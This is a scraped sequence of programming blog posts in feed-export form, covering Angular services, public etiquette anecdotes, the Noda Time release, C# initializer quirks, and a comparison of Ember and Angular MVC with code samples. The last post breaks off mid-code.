Services in Angular are Singletons - which can cause all kinds of interesting headaches if you treat that service as a Model.</p><p>In Joel's case there's nothing wrong with the code here - except that it's not a Model -<strong>it's a Service</strong>and before you think I'm nitpicking -<strong>Service, in Angular, has a very particular reason for existence</strong>and it's not this:</p><blockquote><p>... the “M” in MVC, model classes encapsulate your application’s data and provide an API to access and manipulate that data. The other classes in your application will make requests of models via this API. When data on the model is updated, the model dispatches events that the other classes within your application can react to.</p></blockquote><p>The definition is a good one - unfortunately the code that is being offered to support the definition is actually a Service, not a Model.</p><h2>So What About a Model?</h2><p>I get asked this a fair amount and my answer is typically:</p><blockquote><p>Your model lives on the server</p></blockquote><p><i>hat-tip to Steve Sanderson for this</i></p><p>This works in many ways: it frees you from duplicating code on the client and it keeps secret things secret (such as applying discounts to a shopping cart, etc).</p><p>But what about behavior on individual bits of data?

It's the perfect shade of rich, deep oakey-brown that tells me I hit the right mixture of milk and sugar.</p><p>I'm looking over the hills from the upstairs walkway in front of my office door. Behind me, the door is open and work is waiting for me... in front of me the sun is poking through the golden morning clouds and the dew from the damp air is everywhere.</p><p>It's quiet, and I'm loving it.<strong>Until Garrett entered my life</strong>.</p><p>Well, it was Garrett's girlfriend, actually. It started with a low, shrill sound that came from around the parking lot. It was muffled somewhat but it sounded like someone in trouble. Naturally I looked around, thinking someone might need my help.</p><p>Then all of a sudden the volume increased dramatically as she got out of her car. She was in full hysterics, yelling into the phone about how Garrett was a FUCKING PIECE OF SHIT JERK ASSHOLE etc. etc.</p><p>She stood there for about 30 seconds in the parking lot that was filling with cars as people came to work. They walked past her, careful not to look.</p><p>After a while she slammed the door of her car and stormed upstairs. She works in the office next to mine. I decided to give her some space so I went inside and shut the door. She decided to stay outside and vent her rage over the entire parking lot, into the golden sunrise morning I was just enjoying.</p><p>She stayed there for 20 minutes, then went inside. I got to learn all about Garrett... who apparently is not a very nice person.</p><h2>Yeah Yeah Yeah</h2><p>4 weeks ago I took my family to Kalihiwai Beach where we like to go for barbeques with friends. It was a lovely night, the sun setting much the same way it comes up: golden light poking through swollen, puffed clouds full of warm rain.</p><p>6 of us were sitting around the tailgate of my truck, when right next to us pulls up a black Hummer with blinking blue lights underneath. It's a high-end\"situational\" rental car that is completely out of place here, on this beach in Hawaii. It's an LA ride that looks like the UFO it was apparently dropped from.</p><p>Out of the car comes a 30-something markety/dotcom guy. Thick glasses, tall and in shape. He's from LA - as am I - and we can smell it on each other. He tips his head back:\"SUP\".</p><p>We wave as he reaches back in his car and flips on, full volume,<a href=\"https://www.youtube.com/watch?v=umAL-6-j1Ew\">one of the worst remixes of one of the best Yeah Yeah Yeahs songs there is</a>. He opens the door wide - the one that faces us. He then goes to the back door and does the same... and then turns it up with a remote control in his pocket. All... the way... UP.</p><p>My chest thumps as the bass booms from inside. Purple beat-lights glow with the pulse of this horrible song as the trees ring with the echo of cheesy synth loops.</p><p>He's 20 feet away from us. There are no other cars on this half-mile stretch of beach. He's got this song on a loop so it plays... continually.</p><p>As opposed to Garrett's girlfriend, we didn't stand for it long. My buddy's wife casually went over and asked them to shut the doors facing us and to ... maybe open the doors facing them (no, really). They did, but not without giving stink eye.</p><h2>Bookended</h2><p>At lunch 3 months ago I sat at a table with a friend from out of town and a couple proceeded to get into a fight next to us. The lady stood up to storm away but thought of something clever so turned around just on the other side of us and, snappily, and let him have it. A lovely insult about his new car, flying right over the top of our heads and into his anger-laden face.</p><p>He fought back, she stayed put. We're square in the middle. I sat back and just listened - turning my head as if at an emotional tennis match between the two. The guy looked at me as if to say\"bug off\", I shrugged with my hands in the air (\"where should I go?\")... and they went outside... glaring back at me on the way.</p><h2>CONTEXT</h2><p>So many people are absolutely, stunningly unaware about the little bubble that surrounds them, defined by their thoughts, emotions and words. An interesting (and at the same time scary) thing is that groups of us share these things together - and our bubbles grow as we join into a group.</p><p>We walk around like pachinko balls ... bouncing our bubbles off someone else's. They either repel, or like bubbles, can join and grow larger. You can manage this process.</p><p>In a room full of other people, you have to manage that bubble of yours quite methodically - especially when you're with a group of friends having what you think is a private conversation.<strong>It almost never is</strong>.</p><p>That person sitting next to you on the bus/train/plane speaking really loudly into their cellphone? The new parents involving the entire restaurant in the little game they're playing with little Dylan? Or maybe the person in the front of the line who just now thought about looking at the menu and deciding what to eat...</p><p>Awareness. A Good Thing.</p><p>Whatever you're saying, thinking, emoting - all of it is shared with the people around you to some degree - even if they can't directly hear you. We're a sensitive animal and have senses built into us forged by millions of years of survival, intellect, and cunning. To pretend that words alone define meaning is complete folly.</p><p>Joking with your friend in a room full of diverse people isn't necessarily harmful, until you become blind to your own context as each of the people in the above stories were. Sometimes it doesn't matter. Other times it does.</p><p>You might be sitting next to someone who's sitting on an emotional grenade. That clever little joke you just made? It could be about guns, politics, gay marriage... or dongles. Well it might set that grenade off.</p><p>Call it professionalism, politeness, or just Old Fashioned Decency - it's why these things exist:<strong>so we can get along and avoid atomic swarm tendencies</strong>.</p><p>Until another person welcomes you into their context - no - you're not free (socially speaking) to do as you please without consequence. As much as you might feel you're protected by law to walk naked down the street singing that horrid Yeah Yeah Yeahs remix - your actions have an effect (and consequence) with others.</p><p>The same goes for being upset. Be aware of yourself and just how angry you've become. Think about why, and remember you're in public, around strangers. Think about your actions carefully in the way that the people in the story above did not.</p><p>This doesn't simply sit along gender lines (saying<a href=\"http://blog.8thlight.com/uncle-bob/2013/03/22/There-are-ladies-present.html\">There are Ladies Present</a>is a bit off the mark to me - the issue could as well have been racial or religious). I prefer to think<strong>there are other people present</strong>.</p><p>The only way to truly avoid the hell that can be other people is to understand the power of your own presence. Believe that you<strong>do</strong>have an effect on others.<strong>Just make it a positive one</strong>always.</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=ZagFlqH-NhI:tRZQf2khJVI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=ZagFlqH-NhI:tRZQf2khJVI:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=ZagFlqH-NhI:tRZQf2khJVI:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=ZagFlqH-NhI:tRZQf2khJVI:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=ZagFlqH-NhI:tRZQf2khJVI:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=ZagFlqH-NhI:tRZQf2khJVI:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=ZagFlqH-NhI:tRZQf2khJVI:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/ZagFlqH-NhI\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1272}}

We're far from\"done\" but I believe we're already significantly ahead of most other date/time APIs I've seen in terms of providing a clean API which reduces *incidental* complexity while highlighting the *inherent* complexity of the domain. (This is a theme I'm becoming dogmatic about on various fronts.)</p><p>There's more to do - I can't see myself considering Noda Time to be\"done\" any time soon - but hopefully now we've got a stable release, we can start to build user momentum.</p><p>One point I raised at the<a href=\"http://www.dotnetdevnet.com\">DotNetDevNet</a>presentation tonight was that there's a definite benefit (in my very biased view) in just *looking into* Noda Time:</p><ul><li>If you can't use it in your production code, use it when prototyping</li><li>If you can't use it in your prototype code, play with it in personal projects</li><li>If you can't use it in personal projects, read the user guide to understand the concepts</li></ul><p>I hope that simply looking at the various types that Noda Time providers will give you more insight into how you should be thinking about date and time handling in your code. While the BCL API has a lot of flaws, you can work around most of them if you make it crystal clear what your data means at every step. The type system will leave that largely ambiguous, but there's nothing to stop you from naming your variables descriptively, and adding appropriate<br />comments.</p><p>Of course, I would far prefer it if you'd start using Noda Time and raising issues on how to make it better. Spread the word.</p><p>Oh, and if anyone from the BCL team is reading this and would like to include something like Noda Time into .NET 5 as a\"next generation\" date/time, I'd be *really* interested in talking to you :)</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1818929\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/pQJt1QF_W90\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1273}}

Two interesting little oddities...</p><h1>Is it an object initializer? Is it a collection initializer? No, it’s a syntax error!</h1><p>The first part came out of a real life situation –<a href=\"https://code.google.com/p/noda-time/source/browse/src/NodaTime.Testing/TimeZones/FakeDateTimeZoneSource.cs\">FakeDateTimeZoneSource</a>, if you want to look at the complete context.</p><p>Basically, I have a class designed to help test time zone-sensitive code. As ever, I like to create immutable objects, so I have a builder class. That builder class has various properties which we’d like to be able to set, and we’d also like to be able to provide it with the time zones it supports, as simply as possible. For the zones-only use case (where the other properties can just be defaulted) I want to support code like this:</p><div class=\"code\"><span class=\"Linq\">var</span>source =<span class=\"Keyword\">new</span>FakeDateTimeZoneSource.Builder<br />{<br />    CreateZone(<span class=\"String\">\"x\"</span>),<br />    CreateZone(<span class=\"String\">\"y\"</span>),<br />    CreateZone(<span class=\"String\">\"a\"</span>),<br />    CreateZone(<span class=\"String\">\"b\"</span>)<br />}.Build();</div><p>(<code>CreateZone</code>is just a method to create an arbitrary time zone with the given name.)</p><p>To achieve this, I made the<code>Builder</code>implement<code>IEnumerable&lt;DateTimeZone&gt;</code>, and created an<code>Add</code>method. (In this case the<code>IEnumerable&lt;&gt;</code>implementation actually works; in another case I've used explicit interface implementation and made the<code>GetEnumerator()</code>method throw<code>NotSupportedException</code>, as it's really not<em>meant</em>to be called in either case.)</p><p>So far, so good. The collection initializer worked perfectly as normal. But what about when we want to set some other properties? Without any time zones, that's fine:</p><div class=\"code\"><span class=\"Linq\">var</span>source =<span class=\"Keyword\">new</span>FakeDateTimeZoneSource.Builder<br />{<br />    VersionId =<span class=\"String\">\"foo\"</span><br />}.Build();</div><p>But how could we set<code>VersionId</code><em>and</em>add some zones? This doesn't work:</p><div class=\"code\"><span class=\"Linq\">var</span>invalid =<span class=\"Keyword\">new</span>FakeDateTimeZoneSource.Builder<br />{<br />    VersionId =<span class=\"String\">\"foo\"</span>,<br />    CreateZone(<span class=\"String\">\"x\"</span>),<br />    CreateZone(<span class=\"String\">\"y\"</span>)<br />}.Build();</div><p>That's neither a valid object initializer (the second part doesn't specify a field or property) nor a valid collection initializer (the first part<em>does</em>set a property).</p><p>In the end, I had to expose an<code>IList&lt;DateTimeZone&gt;</code>property:</p><div class=\"code\"><span class=\"Linq\">var</span>valid =<span class=\"Keyword\">new</span>FakeDateTimeZoneSource.Builder<br />{<br />    VersionId =<span class=\"String\">\"foo\"</span>,<br />    Zones = { CreateZone(<span class=\"String\">\"x\"</span>), CreateZone(<span class=\"String\">\"y\"</span>) }<br />}.Build();</div><p>An alternative would have been to expose a propert of type<code>Builder</code>which just returned itself - the same code would have been valid, but it would have been distinctly odd, and allowed some<em>really</em>spurious code.</p><p>I'm happy with the result in terms of the flexibility for clients - but the class design feels a bit messy, and I wouldn't have wanted to expose this for the\"production\" assembly of Noda Time.</p><p>Describing all of this to a colleague gave rise to the following rather sillier observation...</p><h1>Is it an object initializer? Is it a collection initializer? (Parenthetically speaking...)</h1><p>In a lot of C# code, an assignment expression is just a normal expression. That means there's<em>potentially</em>room for ambiguity, in exactly the same kind of situation as above - when sometimes we want a collection initializer, and sometimes we want an object initializer. Consider this sample class:</p><div class=\"code\"><span class=\"Namespace\">using</span>System;<br /><span class=\"Namespace\">using</span>System.Collections;<br /><br /><span class=\"ReferenceType\">class</span>Weird : IEnumerable<br />{<br />   <span class=\"Modifier\">public</span> <span class=\"ReferenceType\">string</span>Foo { get; set; }<br />    <br />   <span class=\"Modifier\">private</span> <span class=\"ValueType\">int</span>count;<br />   <span class=\"Modifier\">public</span> <span class=\"ValueType\">int</span>Count { get {<span class=\"Statement\">return</span>count; } }<br />        <br />   <span class=\"Modifier\">public</span> <span class=\"ValueType\">void</span>Add(<span class=\"ReferenceType\">string</span>x)<br />    {<br />        count++;<br />    }<br />            <br />    IEnumerator IEnumerable.GetEnumerator()<br />    {<br />       <span class=\"Statement\">throw</span> <span class=\"Keyword\">new</span>NotSupportedException();<br />    }    <br />}</div><p>As you can see, it doesn't actually remember anything passed to the<code>Add</code>method, but it does remember how many times we've called it.</p><p>Now let's try using<code>Weird</code>in two ways which<em>only</em>differ in terms of parentheses. First up, no parentheses:</p><div class=\"code\"><span class=\"ReferenceType\">string</span>Foo =<span class=\"String\">\"x\"</span>;<br />Weird weird =<span class=\"Keyword\">new</span>Weird { Foo =<span class=\"String\">\"y\"</span>};<br />    <br />Console.WriteLine(Foo);        <span class=\"InlineComment\">// x</span><br />Console.WriteLine(weird.Foo);  <span class=\"InlineComment\">// y</span><br />Console.WriteLine(weird.Count);<span class=\"InlineComment\">// 0</span></div><p>Okay, so it's odd having a local variable called<code>Foo</code>, but we're basically fine. This is an<em>object</em>initializer, and it's setting the<code>Foo</code>property within the new<code>Weird</code>instance. Now let's add a pair of parentheses:</p><div class=\"code\"><span class=\"ReferenceType\">string</span>Foo =<span class=\"String\">\"x\"</span>;<br />Weird weird =<span class=\"Keyword\">new</span>Weird { (Foo =<span class=\"String\">\"y\"</span>) };<br />    <br />Console.WriteLine(Foo);        <span class=\"InlineComment\">// y</span><br />Console.WriteLine(weird.Foo);  <span class=\"InlineComment\">// Nothing (null)</span><br />Console.WriteLine(weird.Count);<span class=\"InlineComment\">// 1</span></div><p>Just adding those parenthese turn the object initializer into a collection initializer, whose sole item is the result of the assignment operator - which is the value which has now been assigned to<code>Foo</code>.</p><p>Needless to say, I<em>don't</em>recommend using this approach in real code...</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1823825\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/24RyeQVpi8Y\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1275}}

Innovations?</h2><p>Convention over Configuration is a\"pull\" - meaning that it's derived from practice. Conventions evolve and ultimately people agree on them… thus the term\"convention\".</p><p>Rails made use of this most profoundly when it was introduced. From<a href=\"http://gilesbowkett.blogspot.com/2013/02/the-lie-of-convention-over-configuration.html\">Giles Bowkett</a>:</p><blockquote><p>When Rails first arrived, in many instances, it took the greatest ideas and most common use cases of Web development, streamlined them, simplified their developer interface, and repackaged them within cleaner APIs.</p></blockquote><p>Rails also decided to innovate at the same time, and mixed together its conventions with its innovations. The results have been mixed (in my experience):</p><ul><li>The Asset Pipeline was an interesting solution to a problem that I'm not sure many people had. I spent more time trying to get the thing to work as expected - and then finally tossed it.</li><li>I used CoffeeScript for a bit, but don't care much for it. This decreases the interest in the Asset Pipeline.</li><li>I like RSpec. I like Factories vs. Fixtures.<a href=\"http://www.youtube.com/watch?v=obOd7WrrTWQ\">I tend to completely replace the entire testing experience Rails</a>.</li></ul><p>These aren't complaints, really. Every framework you use needs to be modified to a degree to fit how you work - but I do agree with Giles' assertion:</p><blockquote><p>it is literally impossible to impose a convention on a community. It is a contradiction in terms, Orwellian doublespeak, and the human-language equivalent of a syntax error.</p></blockquote><p>For all of the syntax niggling, Rails still lets me do what I want/need to do so I'm a happy camper. I also think the\"conventions\" it once imposed are being tweaked by innovation and becoming something else.</p><p><a href=\"http://gilesbowkett.blogspot.com/2013/02/the-lie-of-convention-over-configuration.html\">Giles calls it\"Curation over Configuration\"</a>and I think I agree with him.</p><h2>Put Your Left Foot Here, Touch Your Nose, And…</h2><p>It seems that most frameworks (of any kind) are beginning to follow Rails' example by introducing some level of Convention over Configuration. This is a great timesaver,<strong>unless there are no conventions to adopt</strong>.</p><p>Which is something I've encountered with EmberJS. No, I'm not going to rant on Ember - I'm still pursuing Trek's prediction:</p><p><blockquote class=\"twitter-tweet\"><p>@<a href=\"https://twitter.com/locks\">locks</a>next post will be about @<a href=\"https://twitter.com/robconery\">robconery</a>'s Road to Damascus Moment. ;)</p>— Trek Glowacki (@trek)<a href=\"https://twitter.com/trek/status/310882156425650177\">March 10, 2013</a></blockquote><script async src=\"//platform.twitter.com/widgets.js\" charset=\"utf-8\"></script></p><p>I haven't given up on Ember - even though I said as much in my last post. Well it's partly<strong>because of my last post</strong>that I can't give up - it wouldn't be fair of me would it :).</p><p>As I dive into Ember more, however,<a href=\"http://emberjs.com/guides/concepts/naming-conventions/\">I've begun musing on\"conventions\" in general</a>:</p><blockquote><p>Ember.js uses naming conventions to wire up your objects without a lot of boilerplate. You will want to use the conventional names for your routes, controllers and templates.</p></blockquote><p>By\"convention\" the team means\"prescription\". This is important because<strong>there is no convention</strong>when it comes to Single Page Applications in the traditional sense of the word\"convention\".<strong>Their naming guidelines are prescriptive</strong>- and something more.</p><p>A lot of frameworks do this kind of thing: Rails, Django, ASP.NET MVC (and I'm sure many others) expect certain files (views, for instance) to be in a particular place (which you can usually override). I like this - it promotes consistency.</p><p>Ember takes this to a different level, however. If you name things a certain way<a href=\"http://net.tutsplus.com/tutorials/javascript-ajax/getting-into-ember-js/\">you can benefit from background code generation</a>:</p><blockquote><p>One of the ways that Ember.js helps to minimize the amount of code needed and handle things for you behind the scenes is through naming conventions. The way that you define and name your routes (and resources) impacts the naming of your controllers, models, views and templates</p></blockquote><p><strong>At what point do we call these\"Incantations\" instead of\"Conventions\"</strong>?</p><h2>The Light Isn't Blinding Me Yet</h2><p>Again - not here to pick on Ember.

This month is Angular, last month was Ember's turn and I gave up. It's the first time I've given up - here's why.</p><p><img src='http://wekeroad.com/images/spinning-dizzy.jpeg'/></p><p><h2>I Tried</h2><p>Saying something confuses me is no great claim - many things do. It's entirely likely that I didn't study Ember long enough, or maybe I didn't give it the\"time to soak in\" that it deserved. Either way I punted on my efforts to bring an Ember title to Tekpub.</p><p>Normally I'd just go about my business and sidestep posts like this one - but today I had a conversation with Trek Glowacki (core dev on the Ember team) and he was confused as to my confusion. I offered to blog my thoughts - he couldn't understand the points I was making about my confusion.</p><p>So here's that post, stripped of hyperbole and\"it's ON FIRE\" statements. It's my honest take on this framework.</p><h2>You Keep Telling Me It's MVC...</h2><p>Yes, the concept of MVC has been contorted over the past decade as web frameworks have adopted it and massaged it to their own ends. What does this mean?</p><ul><li>Controllers in web MVC have a very short lifespan, and there are a lot of them typically</li><li>Views dont' communicate directly to a controller - they have to use an intermediary layer in HTTP (headers, querystring, etc)</li><li>Models are injected into views by Controllers</li><li>Controllers don't command the views directly</li></ul><p>In more classic MVC (aka\"Desktop\") your controllers are typically spun up when the app starts, and configured one time, right there. A controller's job is to command aspects of the view as data changes, and to change the model when things on the view happen that mandate it.</p><p>The model encapsulates the business logic for whatever its modeling, the view presents the data in a nicely formatted way to the user, and the controller sits between. I think we agree on this much - so what's the problem?</p><p>OK this is MVC as far as I have come to know it. There are lots of denominations I am sure - I have to think the church of MVC is about as crowded as the church of REST on any given holiday but there's room for all of us so let's move on...</p><h2>Separation. Only Not.</h2><p>In EmberJS, the<a href=\"http://emberjs.com/guides/controllers/\">controller's job is changed a bit</a>:</p><blockquote><p>A controller may have one or both of these responsibilities:</p><ul><li>Representing a model for a template.</li><li>Storing application properties that do not need to be saved to the server.</li></ul><p>Most of your controllers will be very small. Unlike other frameworks, where the state of your application is spread amongst many controllers, in Ember.js, we encapsulate that state in the router. This allows your controllers to be lightweight and focused on one thing.</p></blockquote><p>For me, this is where the confusion begins. A controller proxies the model, and then exposes itself to the rendering engine so that the view can consume it (you may need to read that sentence twice). As a result, we have view code like this (this is Handlebars):</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span></pre></td><td class='code'><pre><code class='html'><span class='line'>{{#each person in personController}}</span><span class='line'><span class=\"nt\">&lt;h1&gt;</span>{{name}}<span class=\"nt\">&lt;/h1&gt;</span></span><span class='line'>{{/each}}</span></code></pre></td></tr></table></div></figure><p>This can be shorthanded to this:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span></pre></td><td class='code'><pre><code class='html'><span class='line'>{{#each controller}}</span><span class='line'><span class=\"nt\">&lt;h1&gt;</span>{{name}}<span class=\"nt\">&lt;/h1&gt;</span></span><span class='line'>{{/each}}</span></code></pre></td></tr></table></div></figure><p><strong>This is where I hit a conceptual wall</strong>. First: let me say that I'm not the best programmer in the world and I could be dead wrong on this. But as far as I understand it, this is about as tightly bound as we can make things.</p><p>As stated above, a controller\"proxies\" the model onto itself for use in the view. I'm trying my best to reconcile this with the notion that a controller (classically speaking) is supposed to ... well<strong>control</strong>the view. Here, it's not doing that.</p><p>If I'm not mistaken, the view is controlling the controller and the model is nowhere to be found. Well that's not true I spose:<strong>the model is the controller</strong>. Sort of. Well it's not literally the same thing in concept but in practice the controller and the model are one. Bound. Together. Tightly.</p><p>In Angular this separation is achieved by a\"scope\" object that is, basically, a vehicle of sorts that gets passed between the controller and the view:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">PersonCtrl</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$scope</span><span class=\"p\">){</span></span><span class='line'><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">people</span><span class=\"o\">=</span><span class=\"p\">[{</span><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Rob\"</span><span class=\"p\">},</span><span class=\"p\">{</span><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Mary\"</span><span class=\"p\">}]</span></span><span class='line'><span class=\"p\">}</span></span></code></pre></td></tr></table></div></figure><p>In your view, you declare which controller you're using and then consume the information that's on the scope:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;div</span><span class=\"na\">ng-app</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"nt\">&lt;div</span><span class=\"na\">ng-controller=</span><span class=\"s\">'PersonCtrl'</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"nt\">&lt;ul&gt;</span></span><span class='line'><span class=\"nt\">&lt;li</span><span class=\"na\">ng-repeat=</span><span class=\"s\">'person in people'</span><span class=\"nt\">&gt;</span>{{name}}<span class=\"nt\">&lt;/li&gt;</span></span><span class='line'><span class=\"nt\">&lt;/ul&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span></code></pre></td></tr></table></div></figure><p>The downside to this approach is that your HTML is\"compromised\", if you will, and many developers don't like that. My thought is that<strong>it's already compromised using Handlebars</strong>so what's the difference here?  Personally I have no issue using the ng-* directives. Some people do, and I respect that.</p><p>But let's get to the controller code. Notice that the $scope is injected? That's Dependency Injection at work and is a core concept in Angular which greatly helps testability.</p><p>Now you might be saying\"but ROB! The controller is declared directly in the view! That's the same problem!\". And that's true - until you loop in routing (below) and you can remove that directive since it's handled explicitly by routing:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;div</span><span class=\"na\">ng-app</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"nt\">&lt;ul&gt;</span></span><span class='line'><span class=\"nt\">&lt;li</span><span class=\"na\">ng-repeat=</span><span class=\"s\">'person in people'</span><span class=\"nt\">&gt;</span>{{person.name}}<span class=\"nt\">&lt;/li&gt;</span></span><span class='line'><span class=\"nt\">&lt;/ul&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span></code></pre></td></tr></table></div></figure><p>In Backbone a view is created (optionally) with the model (or collection) that it needs for data. There are no controllers (classically) in Backbone - though you can surely wedge one if needed and have it deal with the view.</p><p>These concepts align with my understanding of MVC. Not the case with Ember - if anything it confuses me greatly.</p><h2>Routes, Objects, and More Confusion</h2><p>I can get past the controller issue - I'm not a purist and if there's a reason the team wanted it this way, then I believe them.<a href=\"http://yehudakatz.com/\">It's Yehuda</a>and I think Yehuda is a very nice and smart person (as is<a href=\"http://tomdale.net/\">Tom Dale</a>- the co-creator of Ember).</p><p>I respect these guys so much I want to be very careful to<strong>not suggest</strong>that they don't know what they're doing. As I keep saying:<strong>this is my confusion</strong>. I own it.</p><p>Which brings me to Routes. Here's<a href=\"http://emberjs.com/guides/routing/defining-your-routes/\">one way to define a route</a>using EmberJS that looks rather familiar:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">Router</span><span class=\"p\">.</span><span class=\"nx\">map</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">resource</span><span class=\"p\">(</span><span class=\"s1\">'posts'</span><span class=\"p\">,</span><span class=\"p\">{</span><span class=\"nx\">path</span><span class=\"o\">:</span><span class=\"s1\">'/posts'</span><span class=\"p\">},</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">route</span><span class=\"p\">(</span><span class=\"s1\">'new'</span><span class=\"p\">);</span></span><span class='line'><span class=\"p\">});</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>Rails devs will recognize this straight away as a Resourceful Route. But what does a\"resource\" have to do with a Desktop app? When talking routes, urls, and resources - that's a RESTful consideration and involves stateless state\"stuff\" (sidestepping the REST debate here).<strong>What is this concept doing in a desktop app?</strong>.</p><p>Here's another way to define a route:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">Router</span><span class=\"p\">.</span><span class=\"nx\">map</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">route</span><span class=\"p\">(</span><span class=\"s2\">\"about\"</span><span class=\"p\">);</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">route</span><span class=\"p\">(</span><span class=\"s2\">\"favorites\"</span><span class=\"p\">,</span><span class=\"p\">{</span><span class=\"nx\">path</span><span class=\"o\">:</span><span class=\"s2\">\"/favs\"</span><span class=\"p\">});</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>This is straightforward. Client MVC apps can manipulate browser history with\"hashbang\" URLs for bookmarking convenience. To manage that, we use a router and define routes.</p><p>And if you know that Ember relies heavily on naming conventions you could probably assume that you'll need an AboutController and a FavoritesController (like Rails - and Yehuda is a Rails core dev too so it would make sense...).</p><p>But that's not quite what needs to happen. You need to also define a RouteObject (which you can think of as a route handler):</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">FavoritesRoute</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Route</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">model</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">return</span><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">Favorites</span><span class=\"p\">.</span><span class=\"nx\">find</span><span class=\"p\">();</span></span><span class='line'><span class=\"p\">},</span></span><span class='line'><span class=\"nx\">setupController</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">controller</span><span class=\"p\">,</span><span class=\"nx\">model</span><span class=\"p\">)</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">controller</span><span class=\"p\">.</span><span class=\"nx\">set</span><span 